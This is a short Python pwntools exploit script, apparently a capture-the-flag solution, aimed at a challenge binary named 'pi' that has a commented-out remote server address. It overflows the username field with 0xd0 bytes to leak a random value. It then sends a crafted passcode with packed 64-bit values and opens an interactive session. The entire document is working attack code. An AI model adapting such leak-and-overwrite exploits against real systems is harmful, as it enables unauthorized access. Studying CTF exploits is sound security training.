from pwn import*

p = process("./pi")
#p = remote("183.129.189.60",10022)
context.arch = "amd64"

payload1 = "a" * 0xd0

p.sendlineafter("Username:",payload1)

p.recvuntil("a"*64)

radnum = int(p.recv(10),10)

#print hex(radnum)

#s
#gdb.attach(p,"b* $rebase(0x15c8)")

p.sendlineafter("Passcode:",str(radnum)+p64(0)+p64(8)+p64(0x88)*20)

#p.sendlinea()

#for i in range(10):
#	p.sendlineafter("N =","100")
p.interactive()
